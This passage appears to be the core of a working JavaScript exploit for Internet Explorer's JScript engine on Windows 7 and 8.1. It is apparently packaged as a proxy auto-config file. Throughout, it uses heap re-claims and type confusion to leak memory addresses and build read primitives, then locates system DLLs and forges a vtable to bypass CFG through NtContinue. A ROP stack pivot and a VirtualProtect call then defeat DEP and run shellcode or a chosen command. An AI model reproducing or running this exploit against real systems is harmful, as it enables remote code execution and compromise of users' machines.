        Padding[i] = 0x11111111;
    }
    
    FakeVtable += DwordArrayToBytes(Padding);
    FakeVtable += DwordArrayToBytes([NtContinueAddress.low]);
    FakeVtable += DwordArrayToBytes([NtContinueAddress.high]);
    
    for (var i = (0x140 / 4); i < (0x400 / 4); i++) {
        Padding[i] = 0x22222222;
    }
    
    FakeVtable += DwordArrayToBytes(Padding);
    return FakeVtable;
}

var LFHBlocks = new Array(); // If this is local rather than global the exploit does not work on Windows 8.1 IE11 64-bit
    
function Exploit() {
    if(PayloadType != "shellcode" && PayloadType != "winexec") {
        DebugLog("Fatal error: invalid payload type");
        return 0;
    }

    // Initialization: these anchor re-claim counts have varying affects on exploit stability. The higher the anchor count, the more stable, but the more time the exploit will take.
    
    if(WindowsVersion <= 7) {
        ReClaimNameList = ReClaimIndexNameList;
        NameListAnchorCount = 5000; // 20000 was needed prior to using GC at the start of the exploit. Performance went from around 4 seconds to 700ms when moved to 400. 5000 was the sweet spot on Win7 IE8 64-bit between speed and stability.
    }
    else {
        ReClaimNameList = ReClaimBackupNameLists;
		
		if(PacFile) {
			NameListAnchorCount = 10000;
		}
		else {
			NameListAnchorCount = 400; // The larger this number the more reliable the exploit on Windows 8.1 where LFH cannot easily re-claim
		}
    }
    
    CollectGarbage(); // This GC is essential for re-claims with randomized LFH on precise regions (such as VVAL re-claim), but it also allows for the GcBlock re-claim count to be drastically reduced (otherwise 20000+ was needed, as in the original exploit)
    
    // Trigger LFH for a size of 0x970

    for(var i = 0; i < 50; i++) { // Only 50 are needed to activate LFH, but spraying additional allocations seems to help clog existing free memory regions on the heap and improve LFH re-claim reliability on Win8.1+
        Temp = new Object();
        Temp[Array(570).join('A')] = 1; // Property name size of 0x239 (569 chars with a default +1 added as a terminator) will produce the desired re-claim allocation size.
        LFHBlocks.push(Temp);
    }
    
    // Re-claim with type confusion NameLists
    
    NewUntrackedVarSet();
    DebugLog("Total untracked variables: " + UntrackedVarSet.length.toString(10));
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][SizerPropName] = 1; // 0x239 property name size for 0x970 NameList allocation size
        NameListAnchors[i]["BBBBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
        NameListAnchors[i]["\u0005"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
        NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
    }
    
    AnchorObjectsBackup = NameListAnchors; // Backup name list anchor objects (this will allow re-claim to "stick").
    
    // Leak final VVAL address from one of the NameLists
    
    var LeakedVvalAddress = 0;
    var TypeConfusionAligned = false;
    
    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] % 1 != 0) {
            LeakedVvalAddress = (UntrackedVarSet[i] / 4.9406564584124654E-324); // This division just converts the float into an easy-to-read 32-bit number
            TypeConfusionAligned = true;
            break;
        }
    }
    
    if(!TypeConfusionAligned) {
        DebugLog("Leaked anchor object type confusion re-claim failed: no untracked var aligned with type confusion float/next VVAL pointer");
        return 0;
    }
    
    LeakedVvalAddress = Int52ToDouble(LeakedVvalAddress); // In Windows 7, the leaked heap pointer could always be encoded in 32-bits. On Windows 8.1 IE11, it often consumes more. By leaking the final VVAL pointer with a double float we can get the bits we need. Experimenting with this I learned all JS numbers are 52 bits in size. In the event that the leaked pointer has its highest bits set it may be an invalid double. This hasn't be an issue on Windows 7 x64, x86, or Windows 8.1 x64 during my testing.
    
    if(!LeakedVvalAddress.high && !LeakedVvalAddress.low) {
        DebugLog("Leaked anchor object type confusion re-claim failed: conversion of leaked VVAL address (type confusion successful) to double failed (invalid 52-bit integer)");
        return 0;
    }
    
    // Re-claim with VAR-referencing-VAR NameLists
    
    var PrimaryVvalPropName = "AAAAAAAA"; // 16 bytes for size of GcBlock double linked list pointers

    for(var i = 0; i < 46; i++) {
        PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.low, LeakedVvalAddress.high, 0, 0); // Type 0x80 is a VAR reference
    }
    
    while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A";
    
    // Re-claim with leaked VVAL address vars (to be dereferenced for anchor object index extraction)
    
    NewUntrackedVarSet();
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][PrimaryVvalPropName] = 1;
    }
    
    // Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
    
    var LeakedVvalVar;

    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
            LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
            break;
        }
    }
    
    DebugLog("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
    
    // Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
    
    ReClaimNameList(0x11, "A");
    
    if(LeakedVvalVar + "" != 0x11) {
        DebugLog("Failed to extract final VVAL index via re-claim");
        return 0;
    }

    // Create the mutable variable which will be used throughout the remainder of the exploit and re=claim with VAR-referencing-VAR to it for dereference
    
    ReClaimNameList(0, CreateVar64(0x3, 0x22, 0, 0, 0));
    PrimaryVvalPropName = "AAAAAAAA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

    for(var i = 0; i < 46; i++) {
        PrimaryVvalPropName += CreateVar64(0x80, LeakedVvalAddress.low + 0x40, LeakedVvalAddress.high, 0, 0); // +0x40 is the offset to property name field of 64-bit VVAL struct. Type 0x80 is a VAR reference
    }
    
    while(PrimaryVvalPropName.length < 0x239) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to correct length
    
    // Re-claim with leaked VVAL name property address vars (this is the memory address of the mutable variable that will be created)
    
    NewUntrackedVarSet();
    
    for(var i = 0; i < NameListAnchorCount; i++) {
        NameListAnchors[i][PrimaryVvalPropName] = 1;
    }
    
    for(var i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            if(UntrackedVarSet[i] + "" == 0x22) {
                MutableVar = UntrackedVarSet[i];
                break;
            }
        }
    }
    
    // Verify the mutable var can be changed via simple re-claim
    
    ReClaimNameList(0, CreateVar64(0x3, 0x33, 0, 0, 0));
    
    if(MutableVar + "" != 0x33) {
        DebugLog("Failed to verify mutable variable modification via re-claim");
        return 0;
    }
    
    // Test arbitrary read primitive

    var MutableVarAddress = MakeDouble(LeakedVvalAddress.high, LeakedVvalAddress.low + 0x40);
    
    if(LeakByte64(MutableVarAddress) != 0x8) { // Change mutable var to a BSTR pointing at itself.
        DebugLog("Memory leak test failed");
        return 0;
    }
    
    // Derive jscript.dll base from leaked Object vtable
    
    var DissectedObj = new Object();
    var ObjectAddress = LeakObjectAddress64(LeakedVvalAddress, DissectedObj);
    var VtableAddress = LeakQword64(ObjectAddress);
    var JScriptBase = DiveModuleBase64(VtableAddress);
    
    if(!JScriptBase.low && !JScriptBase.high) {
        DebugLog("Failed to leak JScript.dll base address");
        return 0;
    }
    else {
        DebugLog("Leaked JScript base address: 0x" + JScriptBase.high.toString(16) + JScriptBase.low.toString(16));
    }
    
    // Extract the first Kernel32.dll import from Jscript.dll IAT to dive for its base
    
    var Kernel32Base = BaseFromImports64(JScriptBase, [0x4e52454b, 0x32334c45]);
    
    if(!Kernel32Base.low && !Kernel32Base.high) {
        DebugLog("Kernel32.dll base resolution via Jscript.dll imports failed.");
        return 0;
    }
    else {
        DebugLog("Leaked KERNEL32.DLL base address: 0x" + Kernel32Base.high.toString(16) + Kernel32Base.low.toString(16));
    }
    
    var VirtualProtectAddress;
    var WinExecAddress;
    
    if(PayloadType == "shellcode") {
        // Resolve APIs for command execution: NTDLL.DLL!NtContinue, KERNEL32.DLL!VirtualProtect
        
        VirtualProtectAddress = ResolveExport64(Kernel32Base, [ 0x74726956, 0x506c6175, 0x65746f72, 0x00007463 ]); // VirtualProtect
        
        if(!VirtualProtectAddress.low && !VirtualProtectAddress.high) {
            DebugLog("Failed to resolve address of KERNEL32.DLL!VirtualProtect");
            return 0;
        }
        
        DebugLog("Successfully resolved address of VirtualProtect to: 0x" + VirtualProtectAddress.high.toString(16) + VirtualProtectAddress.low.toString(16));
    }
    else if(PayloadType == "winexec") {
        // Resolve APIs for command execution: NTDLL.DLL!NtContinue, KERNEL32.DLL!WinExec
        
        WinExecAddress = ResolveExport64(Kernel32Base, [0x456e6957]);
        
        if(!WinExecAddress.low && !WinExecAddress.high) {
            DebugLog("Failed to resolve address of KERNEL32.DLL!WinExec");
            return 0;
        }
    }
    
    var MsvcrtBase = BaseFromImports64(JScriptBase, [0x6376736d, 0x642e7472]);

    if(!MsvcrtBase.low && !MsvcrtBase.high) {
        DebugLog("Msvcrt.dll base resolution via Jscript.dll imports failed.");
        return 0;
    }
    
    var NtdllBase = BaseFromImports64(MsvcrtBase, [0x6c64746e, 0x6c642e6c]);
    
    if(!NtdllBase.low && !NtdllBase.high) {
        DebugLog("Ntdll.dll base resolution via Msvcrt.dll imports failed.");
        return 0;
    }
    
    var NtContinueAddress = ResolveExport64(NtdllBase, [0x6f43744e, 0x6e69746e]);
    
    if(!NtContinueAddress.low && !NtContinueAddress.high) {
        DebugLog("Failed to resolve address of NTDLL.DLL!NtContinue");
        return 0;
    }
    
    // Leak an authentic stack pointer to avoid triggering the stack pivot protection built into CFG on Windows 8.1+ within the kernel layer of NTDLL.DLL!NtContinue
                  
    var CSessionAddress = LeakQword64(MakeQword(ObjectAddress.high, ObjectAddress.low + 24)); // Get CSession from offset 24
    var LeakedStackPtr = LeakQword64(MakeQword(CSessionAddress.high, CSessionAddress.low + 80));
    LeakedStackPtr.low += 0x8; // Stack alignment needs to be at a 0x10 boundary prior to CALL
    
    // Construct a fake vtable and fake object for use within mutable var property name
    
    var FakeVtable = CreateFakeVtable(NtContinueAddress);
    FakeVtable = FakeVtable.substr(0, FakeVtable.length);
    var FakeVtableAddress = LeakObjectAddress64(LeakedVvalAddress, FakeVtable);
    var MutableVarAddress = MakeDouble(LeakedVvalAddress.high, LeakedVvalAddress.low + 0x40);
    var FakeObjAddress = MakeDouble(LeakedVvalAddress.high, LeakedVvalAddress.low + 96);
    var Context;

    if(PayloadType == "shellcode") {
        // Allocate memory for shellcode, API output and an artificial stack
    
        var ShellcodeStr = TableToUnicode(Shellcode);
        var ShellcodeLen = MakeDouble(0, (ShellcodeStr.length * 2));
        ShellcodeStr = ShellcodeStr.substr(0, ShellcodeStr.length); // This trick is essential to ensure the "address of" primitive gets the actual address of the shellcode data and not another VAR in a chain of VARs (this happens when a VAR is appended to another repeaatedly as is the case here)
        var ShellcodeAddress = LeakObjectAddress64(LeakedVvalAddress, ShellcodeStr);
        
        /*
        Artificial stack data for use beyond the NTDLL.DLL!NtContinue pivot.
        
                                             
        NTDLL.DLL!NtContinue --------------------> RIP = <MSVCRT.DLL!0x00019baf> | MOV RSP, R11; RET
                                                   RCX = Shellcode address
                                                   RDX = Shellcode size
                                                   R8 = 0x40
                                                   R9 = Leaked address of BSTR to hold out param    
                                                   RSP = Real stack pointer             
                                                   R11 = Artificial stack
        |-----------------------------|            ^
        | 2MB stack space (heap)      |            |
        |-----------------------------|            |
        | Heap header/BSTR len align  |            |
        |-----------------------------|            |
        | KERNEL32.DLL!VirtualProtect | <----------|
        |-----------------------------|
        | Shellcode return address    ]
        |-----------------------------|                                    
        */
        
        var Padding = Array(0x100000 + 1).join('\u0101'); // The +1 here always gives it a clean len (used to be -1)
        var ArtificialStackStr = Padding; // A couple KB were never enough, even for VirtualProtect and WinExec. The WPAD RPC client shellcode for sandbox escape is exceptionally consumptive with stack memory.
        ArtificialStackStr += DwordArrayToBytes([VirtualProtectAddress.low]);
        ArtificialStackStr += DwordArrayToBytes([VirtualProtectAddress.high]);
        ArtificialStackStr += DwordArrayToBytes([ShellcodeAddress.low]);
        ArtificialStackStr += DwordArrayToBytes([ShellcodeAddress.high]);
        ArtificialStackStr += Padding;
        ArtificialStackStr = ArtificialStackStr.substr(0, ArtificialStackStr.length);
        var ArtificialStackAddress = LeakObjectAddress64(LeakedVvalAddress, ArtificialStackStr);
        ArtificialStackAddress.low += ((ArtificialStackStr.length * 2) - (0x100000 * 2) - 0x10); // Point RSP at the return address to the shellcode. The address consistently ends up an 0x8 multiple on Windows 7 IE8 64-bit. Stack overfloow exceptions were becoming an issue when I did not include this tail padding.
        
        var WritableStr = "";
        WritableStr += DwordArrayToBytes([0]);
        WritableStr = WritableStr.substr(0, WritableStr.length);
        var WritableAddress = LeakObjectAddress64(LeakedVvalAddress, WritableStr);
        
        // Dynamically resolve ROP gadget for stack pivot via export hint
    
        var StackPivotAddress;
        var HintExportAddress = ResolveExport64(MsvcrtBase, [ 0x686e6174, 0x00000066 ]); // tanhf
        var MagicOffset;
        
        if(!HintExportAddress.low && !HintExportAddress.high) {
            DebugLog("Failed to resolve address of MSVCRT.DLL!tanhf");
            return 0;
        }
        
        if(WindowsVersion <= 7) {
            MagicOffset = 0x2da + 1; // tanhf:0x00076450 (+0x2da) <- 0x0007672a -> (+0x3e5e) ??_7bad_cast@@6B@:0x0007a588
        }
        else {
            MagicOffset = 0x11f + 19; // tanhf:0x00019a90 (+0x11f) <- 0x00019baf -> (+0x31) acosf:0x00019be0
        }
        
        // 49:8BE3 | mov rsp,r11
        // C3      | ret
        
        StackPivotAddress = HarvestGadget64(HintExportAddress, 0x500, 0xC3E38B49, 0x00000000FFFFFFFF, MagicOffset);
        
        if(!StackPivotAddress.low && !StackPivotAddress.high) {
            DebugLog("Failed to resolve address of stack pivot gadget");
            return 0;
        }
        
        DebugLog("Gadget address of stack pivot: 0x" + StackPivotAddress.high.toString(16) + StackPivotAddress.low.toString(16));
        Context = MakeContextDEPBypass64(LeakedStackPtr, ArtificialStackAddress, StackPivotAddress, VirtualProtectAddress, ShellcodeAddress, ShellcodeLen, WritableAddress);
        DebugLog("Artificial stack pointer address at 0x" + ArtificialStackAddress.high.toString(16) + " " + ArtificialStackAddress.low.toString(16) +" shellcode at 0x" + ShellcodeAddress.high.toString(16) + ShellcodeAddress.low.toString(16) + " CONTEXT pointer: 0x" + FakeObjAddress.high.toString(16) + FakeObjAddress.low.toString(16));
    }
    else if(PayloadType == "winexec") {
        CommandStr = CommandStr.substr(0, CommandStr.length);
        var CommandStrAddress = LeakObjectAddress64(LeakedVvalAddress, CommandStr);
        Context = MakeContextWinExec64(CommandStrAddress, LeakedStackPtr, WinExecAddress);
    }
    
    var RipHijackPropName = CreateVar64(0x81, LeakedVvalAddress.low + 96, LeakedVvalAddress.high, 0, 0) + CreateVar64(0, FakeVtableAddress.low, FakeVtableAddress.high, 0, 0) + Context; // 96 is the 64-bit prop name offset plus size of mutable VAR and next VAR Type field.
    
    /*
    
    jscript.dll!Object.Typeof method
    
    mov rdi,qword ptr ds:[rdi+8]
    mov rax,qword ptr ds:[rdi]
    mov rbx,qword ptr ds:[rax+138]
    mov rcx,rbx
    call qword ptr ds:[7FFA554EC628]
    mov rcx,rdi
    call rbx
    
    Initially RDI holds the pointer to the mutable VAR. Its object pointer is being loaded from +8, and then
    RDI holds the pointer to the fake Object, which is dereferenced into RAX to obtain the vtable pointer.
    Offset 0x138 holds the typeof method pointer within the vtable, which is subsequently passed to CFG 
    for validation.
    
    Since the fake vtable holds the address of NTDLL.DLL!NtContine in place of its typeof method (and this
    address is whitelisted by CFG) the security check will succeed and we will end up with an indirect branch
    instruction (CALL RBX) whch will execute the RIP hijack.
    
    Most notably, since a class method will always be passed its "this" pointer as its first parameter (which
    in x64 will be held in RCX) we not only end up with a RIP hijack but also control of the RCX register.
    Control of this register allows us to control the first parameter to NTDLL.DLL!NtContinue (in this case
    a CONTEXT structure pointer) which conveniently will hold a pointer to our fake object, the contents of
    which we contro. Thus the fake object itself will be interpreted as CONTEXT struct we may control.

    Malicious VVAL property name
    ------------------
    | VAR.Type       | <-- Mutable var
    |----------------|   |
    | VAR.ObjPtr     | <------ Referencing fake object appended to itself in the VVAL property name
    |----------------|     |
    | VAR.Type       |     |-- Not a real VAR (its Type is skipped and never referenced), just a 0 field. 
    |----------------|     |
    | Fake vtable ptr| <---|-- Fake object begins here. RCX and RDI point here
    |----------------|
    | VAR.NextPtr    | <-- Unreferenced, a side-effect of using a VAR struct to initialize the fake object.
    |----------------|
    | CONTEXT        | <-- Notably the first 16 bytes (2 QWORDs) of this struct will be confused with the fake vtable ptr and VAR.NextPtr fields. These fields represent the P1Home and P2Home registers and its fine if they are initialized to 0.
    |________________|

    */
    
    ReClaimNameList(0, RipHijackPropName);
    var TotalTime = (new Date().getTime() - ScriptTimeStart);
    DebugLog("TIME ... total time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
    typeof MutableVar;
}

function FindProxyForURL(url, host){
    return "DIRECT";
}

Exploit();
